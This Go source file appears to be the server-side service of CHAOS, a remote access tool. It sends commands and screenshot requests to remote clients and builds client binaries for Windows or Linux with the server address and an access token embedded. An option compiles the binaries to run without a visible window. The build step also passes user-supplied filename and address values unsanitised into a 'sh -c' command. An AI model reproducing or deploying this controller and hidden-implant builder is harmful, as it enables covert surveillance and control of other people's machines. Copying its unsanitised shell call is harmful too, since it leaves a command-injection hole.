package services

import (
	"context"
	"fmt"
	"github.com/google/uuid"
	"github.com/tiagorlampert/CHAOS/internal/utilities"
	"github.com/tiagorlampert/CHAOS/internal/utilities/constants"
	"github.com/tiagorlampert/CHAOS/internal/utilities/image"
	"github.com/tiagorlampert/CHAOS/internal/utilities/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utilities/system"
	repo "github.com/tiagorlampert/CHAOS/repositories"
	"os/exec"
	"strings"
	"time"
)

const secretKeySize = 50

type clientService struct {
	appVersion     string
	repository     repo.Auth
	payloadService Payload
	authService    Auth
}

func NewClient(
	appVersion string,
	repository repo.Auth,
	payloadCache Payload,
	authService Auth) Client {
	return &clientService{
		repository:     repository,
		payloadService: payloadCache,
		appVersion:     appVersion,
		authService:    authService,
	}
}

func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) (SendCommandOutput, error) {
	addr, err := utilities.DecodeBase64(input.MacAddress)
	if err != nil {
		return SendCommandOutput{}, fmt.Errorf(`error decoding base64: %w`, err)
	}

	c.payloadService.Set(addr, &PayloadData{
		Request: input.Request,
	})
	defer c.payloadService.Remove(addr)

	var payload *PayloadData
	var done bool
	for !done {
		time.Sleep(2 * time.Second)
		res, _ := c.payloadService.Get(addr)
		res.Request = input.Request
		if res.HasResponse {
			payload, _ = HandleResponse(res)
			done = true
		}
	}

	res := utilities.ByteToString(payload.Response)
	if payload.HasError {
		return SendCommandOutput{}, fmt.Errorf(res)
	}
	if len(strings.TrimSpace(res)) == 0 {
		return SendCommandOutput{Response: constants.NoContent}, nil
	}
	return SendCommandOutput{Response: res}, nil
}

func HandleResponse(payload *PayloadData) (*PayloadData, error) {
	switch payload.Request {
	case "screenshot":
		file, err := image.WritePNG(payload.Response)
		if err != nil {
			return nil, err
		}
		payload.Response = utilities.StringToByte(file)
		break
	default:
		return payload, nil
	}
	return payload, nil
}

func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) {
	token, err := c.GenerateNewToken()
	if err != nil {
		return "", err
	}

	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.ServerPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
	filename := handleFilename(input.OSTarget, input.Filename)
	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.appVersion, input.ServerPort, input.ServerAddress, token, filename)
	cmd := exec.Command("sh", "-c", buildCmd)
	cmd.Dir = "client/"

	outputErr, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%w:%s", err, outputErr)
	}
	return filename, nil
}

func (c clientService) GenerateNewToken() (string, error) {
	auth, err := c.authService.First()
	if err != nil {
		return "", err
	}
	return jwt.NewToken(auth.SecretKey, jwt.IdentityDefaultUser)
}

func handleOSType(osType system.OSType) string {
	switch osType {
	case system.Windows:
		return "windows"
	case system.Linux:
		return "linux"
	//case 3:
	//	return "darwin"
	default:
		return "unknown"
	}
}

func runHidden(hidden bool) string {
	if hidden {
		return "-H=windowsgui"
	}
	return ""
}

func handleFilename(osType system.OSType, filename string) string {
	if len(strings.TrimSpace(filename)) <= 0 {
		filename = uuid.New().String()
	}
	switch osType {
	case system.Windows:
		return fmt.Sprint(filename, ".exe")
	default:
		return filename
	}
}
